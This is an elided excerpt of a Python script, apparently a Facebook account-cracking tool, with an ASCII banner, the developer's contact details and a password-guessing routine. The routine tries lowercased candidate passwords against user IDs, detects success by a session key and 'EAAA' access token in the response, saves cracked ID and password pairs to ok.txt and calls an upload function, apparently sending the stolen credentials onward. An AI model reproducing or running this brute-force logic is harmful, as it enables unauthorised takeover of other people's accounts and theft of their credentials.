...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://m.me/Abir.lg17289"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/Abir.lg17289")
...
/____/\_,_/_/ /_/\_\ 
 ...
 > \033[0;96mDEVELOPER     : ABIR
 > \033[0;96mFACEBOOK ID   : ABIR AHMED
 > \033[0;96mWHATSAPP      : +8801730853768
 \033[0;96m> GITHUB        : HACKER ABIR
 > \033[0;96mWARNING       : BAD USE IS PROHIBITED      
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [MAHI] : %s/%s -> \033[0;92m [ MAHIR-OK:%s ]- \033[0;93m[MAHIR-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [DARK-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
